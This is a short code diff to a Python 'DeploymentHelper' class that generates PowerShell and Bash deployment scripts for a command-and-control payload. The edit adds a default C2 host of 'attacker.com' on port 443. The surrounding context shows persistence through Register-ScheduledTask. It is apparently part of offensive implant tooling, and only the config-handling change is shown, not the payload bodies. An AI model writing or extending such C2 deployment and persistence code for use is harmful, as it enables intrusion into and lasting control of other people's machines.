@@ -397,8 +397,10 @@ class DeploymentHelper:
     def generate_deployment_script(self, config: Dict) -> str:
         """Generate PowerShell deployment script"""
         
-        c2_host = config['payload']['c2Host']
-        c2_port = config['payload']['c2Port']
+        # Use payload config if available, otherwise use defaults
+        payload_config = config.get('payload', {})
+        c2_host = payload_config.get('c2Host', 'attacker.com')
+        c2_port = payload_config.get('c2Port', '443')
         
         ps_script = f'''
 # Auto-generated deployment script
@@ -433,8 +435,10 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Fo
     def generate_bash_deployment(self, config: Dict) -> str:
         """Generate Bash deployment script for Linux"""
         
-        c2_host = config['payload']['c2Host']
-        c2_port = config['payload']['c2Port']
+        # Use payload config if available, otherwise use defaults
+        payload_config = config.get('payload', {})
+        c2_host = payload_config.get('c2Host', 'attacker.com')
+        c2_port = payload_config.get('c2Port', '443')
         
         bash_script = f'''
 #!/bin/bash
